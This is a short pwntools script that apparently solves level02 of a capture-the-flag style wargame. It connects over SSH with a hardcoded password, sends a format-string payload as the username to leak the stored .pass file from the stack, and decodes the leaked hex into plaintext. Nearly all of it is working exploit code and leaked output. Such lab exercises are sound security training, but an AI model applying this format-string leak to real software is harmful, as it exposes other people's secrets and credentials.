from pwn import *

### INFORMATIONS ###

# 28 jumpers to beginning of username string
# 22 jumpers to content of .pass file on stack
# Payload to reveal .pass file content : %22$p|%23$p|%24$p|%25$p|%26$p


### AUTOMATIC EXPLOIT ###

s = ssh(host="192.168.1.3", port=4242, user="level02", password="PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv")
p = s.process("/home/users/level02/./level02")

p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.sendline(b"%22$p|%23$p|%24$p|%25$p|%26$p")
p.sendline(b"aaaa")
p.recvline()

result = p.recvlineS()
result = result[:95]
chunks = result.split('|')
passw = ''

for chunk in chunks :
    ba = bytearray.fromhex(chunk[2:])
    ba.reverse()
    passw += ba.decode()

print("[+] Exfiltrated .pass from stack memory : " + passw)



### MANUAL EXPLOIT ###

# ./level02
# --[ Username: %22$p|%23$p|%24$p|%25$p|%26$p
# --[ Password: aaaa
# Convert leaked values to ASCII with the script below

'''
ba = bytearray.fromhex("756e505234376848")
ba.reverse()
string_1 = ba.decode()

ba = bytearray.fromhex("45414a3561733951")
ba.reverse()
string_2 = ba.decode()

ba = bytearray.fromhex("377a7143574e6758")
ba.reverse()
string_3 = ba.decode()

ba = bytearray.fromhex("354a35686e475873")
ba.reverse()
string_4 = ba.decode()

ba = bytearray.fromhex("48336750664b394d")
ba.reverse()
string_5 = ba.decode()

print(string_1 + string_2 + string_3 + string_4 + string_5)
'''
